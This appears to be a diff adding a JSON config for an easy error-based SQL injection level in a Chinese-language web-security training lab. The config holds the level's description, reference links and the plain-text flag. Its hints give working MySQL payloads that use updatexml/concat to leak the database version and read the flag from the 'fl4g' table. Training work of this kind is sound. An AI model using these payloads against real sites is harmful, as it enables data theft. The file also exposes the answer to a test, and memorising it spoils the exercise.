@@ -1,0 +1,35 @@
+{
+  "id": "sql2",
+  "path": "/sql2",
+  "type": "php",
+  "public": false,
+  "backend": "mysql:sqlilab2",
+  "note": "报错注入",
+  "category": "sql",
+  "title": "会说话的报错 · 报错注入",
+  "difficulty": "easy",
+  "url_path": "/sql2",
+  "flag": "flag{sql2_8d47e0b6}",
+  "knowledge": [
+    {
+      "name": "MySQL 报错注入函数参考（extractvalue/updatexml）",
+      "url": "https://portswigger.net/web-security/sql-injection/exploiting-error-based-injection"
+    },
+    {
+      "name": "MDN — SQL（基础语法）",
+      "url": "https://developer.mozilla.org/zh-CN/docs/Glossary/SQL"
+    }
+  ],
+  "hints": [
+    "先确认注入点：<code>?username=admin' and '1'='1</code> 与 <code>?username=admin' and '1'='2</code> 对比。",
+    "构造报错：<code>?username=admin' and updatexml(1,concat(0x7e,(select version()),0x7e),1)-- -</code>，报错里应出现版本号。",
+    "updatexml 第二个参数必须是合法 XPath，<code>concat(0x7e,...)</code> 里的 <code>~</code> 让它必然非法，从而把查询结果拼进报错。",
+    "flag 在 <code>fl4g</code> 表：<code>?username=admin' and updatexml(1,concat(0x7e,(select flag from fl4g limit 1),0x7e),1)-- -</code>"
+  ],
+  "description_html": "这次页面只告诉你“用户存在/不存在”，数据不回显了。但开发者把 <b>MySQL 报错信息原样打印</b>了出来——让查询报错，并把想查的数据“夹带”进报错文本里带出来（<code>updatexml</code> 是经典载体）。输入是字符串型，记得闭合单引号。",
+  "entry": "index.php",
+  "runtime": "php",
+  "writeup": "writeup.md",
+  "prev": "sql1",
+  "next": "sql3"
+}
